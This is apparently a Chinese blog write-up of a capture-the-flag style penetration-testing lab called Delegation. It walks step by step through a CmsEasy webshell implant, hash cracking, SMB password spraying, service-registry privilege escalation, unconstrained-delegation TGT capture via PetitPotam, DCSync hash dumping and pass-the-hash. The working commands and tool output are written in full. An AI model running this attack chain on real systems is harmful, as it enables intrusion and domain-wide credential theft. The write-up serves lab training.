---
typora-root-url: 春秋云境Delegation
title: 春秋云境Delegation
toc: true
categories:
  - 渗透测试
date: 2026-03-08 22:15:08
tags: 
  - 渗透测试
---

# 春秋云境Delegation

fsan扫

```
E:\Users\tiand>fscan  -h 39.98.124.53
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[796ms]     已选择服务扫描模式
[796ms]     开始信息扫描
[797ms]     最终有效主机数量: 1
[797ms]     开始主机扫描
[797ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[797ms]     有效端口数量: 233
[886ms] [*] 端口开放 39.98.124.53:80
[961ms] [*] 端口开放 39.98.124.53:21
[961ms] [*] 端口开放 39.98.124.53:3306
[961ms] [*] 端口开放 39.98.124.53:22
[3.8s]     扫描完成, 发现 4 个开放端口
[3.8s]     存活端口数量: 4
[3.8s]     开始漏洞扫描
[3.8s]     POC加载完成: 总共387个，成功387个，失败0个
[4.2s] [*] 网站标题 http://39.98.124.53       状态码:200 长度:68104  标题:中文网页标题
```

80端口有个cmseasy

## CmsEasy

![image-20260308200339209](image-20260308200339209.png)

```
http://39.98.124.53/?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5

{"userid":"1","username":"admin","password":"e10adc3949ba59abbe56e057f20f883e","nickname":"\u7ba1\u7406\u5458","groupid":"2","checked":"1","qqlogin":"","alipaylogin":"","wechatlogin":"","avatar":"","userip":"","state":"0","qq":"1111","e_mail":"admin@admin.com","address":"admin","tel":"admin","question":"","answer":"","intro":"","point":"0","introducer":"0","regtime":"0","sex":"","isblock":"0","isdelete":"0","headimage":"\/html\/upload\/images\/201907\/15625455867367.png","integration":"0","couponidnum":"17:0:1","collect":"2,4,3,46,14,73","menoy":"100.07","adddatetime":"2021-09-01 00:00:00","notifiid":"","templatelang":"cn","adminlang":"cn","buyarchive":"","adminlangdomain":"","templatelangdomain":"","expired_time":"0"}

└─$ echo 'e10adc3949ba59abbe56e057f20f883e'>hash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (?)
1g 0:00:00:00 DONE (2026-03-08 20:06) 100.0g/s 76800p/s 76800c/s 76800C/s 123456..james1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

拿到密码123456

http://39.98.124.53/index.php?case=user&act=login登录成功

![image-20260308213007832](image-20260308213007832.png)

```
http://39.99.141.84/index.php?case=language&act=add&admin_dir=admin&site=default&id=1&lang_choice=system_custom.php#index_connent
```

phpinfo()改成eval($_POST[1])

蚁剑连接http://39.98.124.53/lang/cn/system_custom.php 密码：1

```
(www-data:/var/www/html/lang/cn) $ find / -name flag* 2>/dev/null
/usr/src/linux-headers-5.4.0-113/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-5.4.0-26-generic/include/config/arch/uses/high/vma/flags.h
/usr/src/linux-headers-5.4.0-113-generic/include/config/arch/uses/high/vma/flags.h
/usr/src/linux-headers-5.4.0-26/scripts/coccinelle/locks/flags.cocci
/home/flag
/home/flag/flag01.txt
(www-data:/var/www/html/lang/cn) $ ls -al /home/flag/flag01.txt
-r-------- 1 root root 798 Mar  8 21:22 /home/flag/flag01.txt
(www-data:/var/www/html/lang/cn) $ find / -perm -u=s 2>/dev/null
/usr/bin/stapbpf
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/staprun
/usr/bin/at
/usr/bin/diff
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
(www-data:/var/www/html/lang/cn) $ ls -al /usr/bin/diff
-rwsr-xr-x 1 root root 219480 Apr  8  2019 /usr/bin/diff
www-data:/var/www/html/lang/cn) $ diff /home/flag/flag01.txt /sys/devices/pnp0/00:04/tty/ttyS0/flags
1,15c1
<   ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     
<  |  _"\ \| ___"|/ |"|    \| ___"|/U /"___|uU  /"\  u  |_ " _|     ___     \/"_ \/ | \ |"|    
< /| | | | |  _|" U | | u   |  _|"  \| |  _ / \/ _ \/     | |      |_"_|    | | | |<|  \| |>   
< U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u   
<  |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|    
<   |||_   <<   >>  //  \\  <<   >>   _)(|_   \\    >>  _// \\_.-,_|___|_,-.  \\    ||   \\,-. 
<  (__)_) (__) (__)(_")("_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-' '-(_/  (__)   (_")  (_/  
< 
< flag01: flag{bab30806-1224-45eb-82b6-101778ebf0ee}
< 
< Great job!!!!!!
< 
< Here is the hint: WIN19\Adrian
< 
< I'll do whatever I can to rock you...
---
> 0x10000040
```

fscan扫内网，挂代理

```
(www-data:/var/www/html/lang/cn) $ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:24:69:ba brd ff:ff:ff:ff:ff:ff
    inet 172.22.4.36/16 brd 172.22.255.255 scope global dynamic eth0
       valid_lft 1892159088sec preferred_lft 1892159088sec
    inet6 fe80::216:3eff:fe24:69ba/64 scope link 
       valid_lft forever preferred_lft forever
(www-data:/var/www/html/lang/cn) $ chmod +x fscan 
(www-data:/var/www/html/lang/cn) $ ./fscan -h 172.22.4.36/24
(www-data:/var/www/html/lang/cn) $ cat res*
172.22.4.7:445 open
172.22.4.19:445 open
172.22.4.45:445 open
172.22.4.7:139 open
172.22.4.19:139 open
172.22.4.45:139 open
172.22.4.19:135 open
172.22.4.7:135 open
172.22.4.45:135 open
172.22.4.45:80 open
172.22.4.36:80 open
172.22.4.36:22 open
172.22.4.36:21 open
172.22.4.7:88 open
172.22.4.36:3306 open
[*] NetInfo 
[*]172.22.4.19
   [->]FILESERVER
   [->]172.22.4.19
[*] NetInfo 
[*]172.22.4.45
   [->]WIN19
   [->]172.22.4.45
[*] NetInfo 
[*]172.22.4.7
   [->]DC01
   [->]172.22.4.7
[*] NetBios 172.22.4.45     XIAORANG\WIN19                
[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393
[*] OsInfo 172.22.4.7    (Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题
[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server

172.22.4.36（入口点）
172.22.4.45（IIS-WIN19）
172.22.4.19（FILESERVER）
172.22.4.7（DC）
```

## SMB爆破

提示里WIN19\Adrian，rockyou爆破试试

```
└─$ proxychains crackmapexec smb  172.22.4.45 -d WIN19 -u Adrian -p /usr/share/wordlists/rockyou.txt 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
SMB         172.22.4.45     445    WIN19            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19) (domain:WIN19) (signing:False) (SMBv1:False)
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:123456 STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:12345 STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:123456789 STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:password STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:iloveyou STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:princess STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:1234567 STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:rockyou STATUS_LOGON_FAILURE
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED
```

babygirl1密码过期，改密码

smbpasswd改密码失败不知道为啥，只能改域的smb的吗

kali的rdesktop去连可以改密码

```
proxychains rdesktop 172.22.4.45
```

改为admin@123，rdp

普通用户（非管理员组），不是域用户，SharpHound收集不了信息，基本横向不了

想办法提权

普通非服务账户一般通过注册表去提权

PrivescCheck扫

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

| TEST | SERVICES > Registry Permissions                | VULN |
+------+------------------------------------------------+------+
| DESC | Parse the registry and check whether the current user |
|      | can modify the configuration of any registered        |
|      | service.                                              |
+------+-------------------------------------------------------+
[*] Found 3 result(s).


Name              : gupdate
ImagePath         : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetV
                    alue, QueryValue
Status            : Stopped
UserCanStart      : True
UserCanStop       : True

Name              : gupdate
ImagePath         : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\gupdate
IdentityReference : BUILTIN\Users
Permissions       : WriteDAC, Notify, ReadControl, CreateLink, EnumerateSubKeys, WriteOwner, Delete, CreateSubKey, SetV
                    alue, QueryValue
Status            : Stopped
UserCanStart      : True
UserCanStop       : True

Name              : Spooler
ImagePath         : C:\Windows\System32\spoolsv.exe
User              : LocalSystem
ModifiablePath    : HKLM\SYSTEM\CurrentControlSet\Services\Spooler
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : ReadControl, EnumerateSubKeys, WriteOwner, CreateSubKey, QueryValue
Status            : Running
UserCanStart      : False
UserCanStop       : False
```

在HKLM\SYSTEM\CurrentControlSet\Services\gupdate的ImagePath改为

```
cmd.exe /c net user hacker admin@123 /add & net localgroup administrators hacker /add
```

相当于

```
C:\Users\Adrian>reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c net user hacker admin@123 /add & net localgroup administrators hacker /add" /f
操作成功完成。

C:\Users\Adrian>sc start gupdate
[SC] StartService 失败 1053:

服务没有及时响应启动或控制请求。


C:\Users\Adrian>net user

\\WIN19 的用户帐户

-------------------------------------------------------------------------------
Administrator            Adrian                   DefaultAccount
Guest                    hacker                   WDAGUtilityAccount
命令成功完成。
```

用hacker用户rdp上去，以管理员身份运行cmd

```
C:\Windows\system32>dir c:\ /S /B |findstr flag
c:\Users\Administrator\flag
c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag02.txt.lnk
c:\Users\Administrator\flag\flag02.txt

C:\Windows\system32>type c:\Users\Administrator\flag\flag02.txt
 ________  _______   ___       _______   ________  ________  _________  ___  ________  ________
|\   ___ \|\  ___ \ |\  \     |\  ___ \ |\   ____\|\   __  \|\___   ___\\  \|\   __  \|\   ___  \
\ \  \_|\ \ \   __/|\ \  \    \ \   __/|\ \  \___|\ \  \|\  \|___ \  \_\ \  \ \  \|\  \ \  \\ \  \
 \ \  \ \\ \ \  \_|/_\ \  \    \ \  \_|/_\ \  \  __\ \   __  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \
  \ \  \_\\ \ \  \_|\ \ \  \____\ \  \_|\ \ \  \|\  \ \  \ \  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \
   \ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\   \ \__\ \ \__\ \_______\ \__\\ \__\
    \|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__|    \|__|  \|__|\|_______|\|__| \|__|


flag02: flag{2799f3a0-5b09-4964-9b9a-79a8abc6891d}

```

## 非约束委派

根据题目名查委派，找到本机器WIN19有非约束委派

```
C:\Users\hacker\Desktop>AdFind.exe -b "DC=xiaorang,DC=lab" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName

AdFind V01.62.00cpp Joe Richards (support@joeware.net) October 2023

Using server: DC01.xiaorang.lab:389
Directory: Windows Server 2016

dn:CN=DC01,OU=Domain Controllers,DC=xiaorang,DC=lab
>cn: DC01
>distinguishedName: CN=DC01,OU=Domain Controllers,DC=xiaorang,DC=lab

dn:CN=WIN19,CN=Computers,DC=xiaorang,DC=lab
>cn: WIN19
>distinguishedName: CN=WIN19,CN=Computers,DC=xiaorang,DC=lab
```

非约束委派要用dc上的服务来向本机认证把tgt带过来

先抓WIN19$hash

```
Authentication Id : 0 ; 27983 (00000000:00006d4f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2026/3/9 20:12:07
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WIN19$
         * Domain   : XIAORANG
         * NTLM     : 969585cc79a37de9c3cb013988087dfe
         * SHA1     : 1e8fd90de4dcae40572a32fac7c7d6c3daf9f468
        tspkg :
        wdigest :
         * Username : WIN19$
         * Domain   : XIAORANG
         * Password : (null)
        kerberos :
         * Username : WIN19$
         * Domain   : xiaorang.lab
```

然后监听tgt

```
Rubeus.exe monitor /interval:1 /targetuser:DC01$ /nowrap >out.txt
```

PetitPotam强制认证

```
E:\exploit\tools\Delegation\PetitPotam-main>python PetitPotam.py  -u WIN19$ -hashes :969585cc79a37de9c3cb013988087dfe WIN19 172.22.4.7

或者
proxychains4 python3 dfscoerce.py -u WIN19$ -hashes :ef957d773fb27054b92e1b1593ce5d18 WIN19 172.22.4.7
```

来让dc认证WIN19

得到tgt

```

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: TGT Monitoring
[*] Target user     : DC01$
[*] Monitoring every 1 seconds for new TGTs


[*] 2026/3/9 13:39:24 UTC - Found new TGT:

  User                  :  DC01$@XIAORANG.LAB
  StartTime             :  2026/3/9 20:12:43
  EndTime               :  2026/3/10 6:12:43
  RenewTill             :  2026/3/16 20:12:43
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4TKJbLVhei2DBS4VhQOlCs1Bzvje5NOxWOAsTNmHsleBwVyl6QBdBV0EjT1fe2nu9ZIA6k9NtTI1BQ3ju1Sqzid2jPNsYv6S6kXrGlQQFdjeJeyWSxtYsiqv7iXVGcFRINBG/qSzsuVBnVQ1eV390MSaFVPt0dpLs230Jf57vQ6NwqvlwwQdDKTnDpdb6aeXjUkpwPKACEQL78daSrdFkndWZ206S++qwppgdBmzdNeUPJPYn2Mw39icJio+D3XGM7+EWhNS2n7yH+de8dbQ8m6PPUqbsSwDyRotCzuDTekONounuNbJYfwoon7zxha34gircMplKDWRDW3/wW9j2nelCNTmU5iOQPRdnzmHu/h9UhZ71XROepSKBxoAH6DUE2z/DN/NqxZSx8477dw/Pqjq+atw8sH+HClTb7ZBIz+NWqrvWwT7wUVT/CntD4LyHamsbFzQhRN2A2L7ZIPYfTgAM1M/i0tmyQ9aP46C6IczAyviXyXXKQY9cQGNtT6s9b32QzdmGdR2eUUK9xzaSOEHIfzeVe12Pap8bW0acp4Ug1mnWX1mM/lgt0Eg7FDgytlmmj58YU2YE8K+ilBo7HRCTJtxxTYFFjiE52svNxJQae1L2GdC8PgzR2mb2ZjMaQd76QCtzHVoQmOyTdV3y7CUZbxr6TlPlq1oQlVQGy8t2kZ3mPiK97dHsnvjojrP+t5PnDJMxt7dUZXGsVsiBpGHhk1G6jGhmM2SVlXXLPQWmqqnkpyx2JjXHPT9eXmS0IrP/xoBsgxUnxHVCy0bC8jNlAUAmbmSwVQnbpJJ5+IB6VI9oUWW682Qa2W55y4G18GiOJPyZFJ+UmoHrJuGEDiE71DSHDsCpyfXlvfgh+HYoMDcvyXCx3x0HWsJ1k26bEGzKsorfP91gg0pdLWOPqOtY8U2gd/yGgOUiPzgA6d7L8EH+SWhVRiE9cqJxfiGmHpPs9cVsyrUR6X+sza5PWAxRghwQkI5HxKKxukfQsM3tPqJ8sIbWkK4LhOYZ9MnTSiQGq+dleU385SnTnyVXFH/d6TVfyFRBY+pfxdcuridfMMehUYRn2IqbOKoZTWVEcZ0tDGyh39pcds8cISxEZWCQvBL0x1+yu/TVeUPcVzpXAgYO1Dxj6rNkCnCZgVH4//dh8S2kBWrz4OktgyeV5itjDbD8x7r2ZQO9bq/Z2RqOs1BGcgXUJWtjA+TZMXlj3AXRzBw338hde251sjLTwQfxE7hvp1U9xrUSS+9B0ZpfKcxkY453pIH/bMxKs+77IZjAcm8KrtJj0ri18llxce5yEIk3DjXe4oRa90GNw/SlmwlfospqZerHPG11o0zvQlmxj4mSoIfXKlKQVyQeL29IXIxMW6rGDa8zourpQLMeKNhRVkuSMMRXj/ln43ZobP2QMOuhYgA2ywIm335Va6KhrmkS75lBZB3o6CoSjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAKBRpxvGOuiV5xEacq5E7AxA7gfeKomQa3PyB+t5zDm6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDMwOTEyMTI0M1qmERgPMjAyNjAzMDkyMjEyNDNapxEYDzIwMjYwMzE2MTIxMjQzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==

[*] Ticket cache size: 1


```

然后Rubeus导入tgt

```
C:\Users\hacker\Desktop>Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD4TKJbLVhei2DBS4VhQOlCs1Bzvje5NOxWOAsTNmHsleBwVyl6QBdBV0EjT1fe2nu9ZIA6k9NtTI1BQ3ju1Sqzid2jPNsYv6S6kXrGlQQFdjeJeyWSxtYsiqv7iXVGcFRINBG/qSzsuVBnVQ1eV390MSaFVPt0dpLs230Jf57vQ6NwqvlwwQdDKTnDpdb6aeXjUkpwPKACEQL78daSrdFkndWZ206S++qwppgdBmzdNeUPJPYn2Mw39icJio+D3XGM7+EWhNS2n7yH+de8dbQ8m6PPUqbsSwDyRotCzuDTekONounuNbJYfwoon7zxha34gircMplKDWRDW3/wW9j2nelCNTmU5iOQPRdnzmHu/h9UhZ71XROepSKBxoAH6DUE2z/DN/NqxZSx8477dw/Pqjq+atw8sH+HClTb7ZBIz+NWqrvWwT7wUVT/CntD4LyHamsbFzQhRN2A2L7ZIPYfTgAM1M/i0tmyQ9aP46C6IczAyviXyXXKQY9cQGNtT6s9b32QzdmGdR2eUUK9xzaSOEHIfzeVe12Pap8bW0acp4Ug1mnWX1mM/lgt0Eg7FDgytlmmj58YU2YE8K+ilBo7HRCTJtxxTYFFjiE52svNxJQae1L2GdC8PgzR2mb2ZjMaQd76QCtzHVoQmOyTdV3y7CUZbxr6TlPlq1oQlVQGy8t2kZ3mPiK97dHsnvjojrP+t5PnDJMxt7dUZXGsVsiBpGHhk1G6jGhmM2SVlXXLPQWmqqnkpyx2JjXHPT9eXmS0IrP/xoBsgxUnxHVCy0bC8jNlAUAmbmSwVQnbpJJ5+IB6VI9oUWW682Qa2W55y4G18GiOJPyZFJ+UmoHrJuGEDiE71DSHDsCpyfXlvfgh+HYoMDcvyXCx3x0HWsJ1k26bEGzKsorfP91gg0pdLWOPqOtY8U2gd/yGgOUiPzgA6d7L8EH+SWhVRiE9cqJxfiGmHpPs9cVsyrUR6X+sza5PWAxRghwQkI5HxKKxukfQsM3tPqJ8sIbWkK4LhOYZ9MnTSiQGq+dleU385SnTnyVXFH/d6TVfyFRBY+pfxdcuridfMMehUYRn2IqbOKoZTWVEcZ0tDGyh39pcds8cISxEZWCQvBL0x1+yu/TVeUPcVzpXAgYO1Dxj6rNkCnCZgVH4//dh8S2kBWrz4OktgyeV5itjDbD8x7r2ZQO9bq/Z2RqOs1BGcgXUJWtjA+TZMXlj3AXRzBw338hde251sjLTwQfxE7hvp1U9xrUSS+9B0ZpfKcxkY453pIH/bMxKs+77IZjAcm8KrtJj0ri18llxce5yEIk3DjXe4oRa90GNw/SlmwlfospqZerHPG11o0zvQlmxj4mSoIfXKlKQVyQeL29IXIxMW6rGDa8zourpQLMeKNhRVkuSMMRXj/ln43ZobP2QMOuhYgA2ywIm335Va6KhrmkS75lBZB3o6CoSjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAKBRpxvGOuiV5xEacq5E7AxA7gfeKomQa3PyB+t5zDm6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI2MDMwOTEyMTI0M1qmERgPMjAyNjAzMDkyMjEyNDNapxEYDzIwMjYwMzE2MTIxMjQzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\Users\hacker\Desktop>klist

当前登录 ID 是 0:0x3e7

缓存的票证: (1)

#0>     客户端: DC01$ @ XIAORANG.LAB
        服务器: krbtgt/XIAORANG.LAB @ XIAORANG.LAB
        Kerberos 票证加密类型: AES-256-CTS-HMAC-SHA1-96
        票证标志 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        开始时间: 3/9/2026 20:12:43 (本地)
        结束时间:   3/10/2026 6:12:43 (本地)
        续订时间: 3/16/2026 20:12:43 (本地)
        会话密钥类型: AES-256-CTS-HMAC-SHA1-96
        缓存标志: 0x1 -> PRIMARY
        调用的 KDC:
```

然后dcsync

## DCsync

```
mimikatz # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
502     krbtgt  767e06b9c74fd628dd13785006a9092b        514
1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512
1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512
1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096
1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096
1000    DC01$   dfe087f43ceaca285a0c517dfe50ec35        532480
500     Administrator   4889f6553239ace1f7c47fa2c619c252        512
1103    FILESERVER$     d0a1ed0e53c353cf29aff34a3ea14112        4096
1104    WIN19$  969585cc79a37de9c3cb013988087dfe        528384
```

然后pth即可

```
E:\exploit\tools\impacket\examples>python atexec.py administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252 c
md                                                                                                                      Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

usage: atexec.py [-h] [-session-id SESSION_ID] [-ts] [-silentcommand] [-debug] [-codec CODEC] [-hashes LMHASH:NTHASH]
                 target [command ...]
atexec.py: error: unrecognized arguments: cmd
E:\exploit\tools\impacket\examples>python wmiexec.py administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
                                                                                                                        [*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir C:\ /S /B|findstr flag
C:\Documents and Settings\Administrator\flag
C:\Documents and Settings\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Documents and Settings\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag04.txt.lnk
C:\Documents and Settings\Administrator\Application Data\Microsoft\Windows\Recent\flag.lnk
C:\Documents and Settings\Administrator\Application Data\Microsoft\Windows\Recent\flag04.txt.lnk
C:\Documents and Settings\Administrator\flag\flag04.txt
C:\Documents and Settings\Administrator\Recent\flag.lnk
C:\Documents and Settings\Administrator\Recent\flag04.txt.lnk
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag04.txt.lnk
C:\Users\Administrator\Application Data\Microsoft\Windows\Recent\flag.lnk
C:\Users\Administrator\Application Data\Microsoft\Windows\Recent\flag04.txt.lnk
C:\Users\Administrator\flag\flag04.txt
C:\Users\Administrator\Recent\flag.lnk
C:\Users\Administrator\Recent\flag04.txt.lnk

C:\>whoami
xiaorang\administrator

C:\>type C:\Users\Administrator\flag\flag04.txt
 ______   _______  _        _______  _______  _______ __________________ _______  _
(  __  \ (  ____ \( \      (  ____ \(  ____ \(  ___  )\__   __/\__   __/(  ___  )( (    /|
| (  \  )| (    \/| (      | (    \/| (    \/| (   ) |   ) (      ) (   | (   ) ||  \  ( |
| |   ) || (__    | |      | (__    | |      | (___) |   | |      | |   | |   | ||   \ | |
| |   | ||  __)   | |      |  __)   | | ____ |  ___  |   | |      | |   | |   | || (\ \) |
| |   ) || (      | |      | (      | | \_  )| (   ) |   | |      | |   | |   | || | \   |
| (__/  )| (____/\| (____/\| (____/\| (___) || )   ( |   | |   ___) (___| (___) || )  \  |
(______/ (_______/(_______/(_______/(_______)|/     \|   )_(   \_______/(_______)|/    )_)


Awesome! Now you have taken over the entire domain network.


flag04: flag{b7720e8a-e75a-4ab9-99a1-f49531eecd52}
```

```
E:\exploit\tools\impacket\examples>python smbexec.py xiaorang.lab/administrator@172.22.4.19 -hashes :4889f6553239ace1f7c
47fa2c619c252                                                                                                           Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[!] Launching semi-interactive shell - Careful what you execute                                                         nt authority\system

C:\windows\system32>dir c:\ /S /B|findstr flag
[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.

E:\exploit\tools\impacket\examples>python smbexec.py xiaorang.lab/administrator@172.22.4.19 -hashes :4889f6553239ace1f7c
47fa2c619c252
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
                                                                                                                        [!] Launching semi-interactive shell - Careful what you execute
C:\windows\system32>whoami
nt authority\system

C:\windows\system32>type c:\users\administrator\flag\flag*

c:\users\administrator\flag\flag03.txt


   . .       . .       .         . .       . .       . .       . .    .    .       . .       . .
.+'|=|`+. .+'|=|`+. .+'|      .+'|=|`+. .+'|=|`+. .+'|=|`+. .+'|=|`+.=|`+. |`+. .+'|=|`+. .+'|=|`+.
|  | `+ | |  | `+.| |  |      |  | `+.| |  | `+.| |  | |  | |.+' |  | `+.| |  | |  | |  | |  | `+ |
|  |  | | |  |=|`.  |  |      |  |=|`.  |  | .    |  |=|  |      |  |      |  | |  | |  | |  |  | |
|  |  | | |  | `.|  |  |      |  | `.|  |  | |`+. |  | |  |      |  |      |  | |  | |  | |  |  | |
|  |  | | |  |    . |  |    . |  |    . |  | `. | |  | |  |      |  |      |  | |  | |  | |  |  | |
|  | .+ | |  | .+'| |  | .+'| |  | .+'| |  | .+ | |  | |  |      |  |      |  | |  | |  | |  |  | |
`+.|=|.+' `+.|=|.+' `+.|=|.+' `+.|=|.+' `+.|=|.+' `+.| |..|      |.+'      |.+' `+.|=|.+' `+.|  |.|



flag03: flag{d2451c34-170c-4e6a-8059-572e98da677e}


Here is fileserver.xiaorang.lab, you might find something interesting on this host that can help you!
```

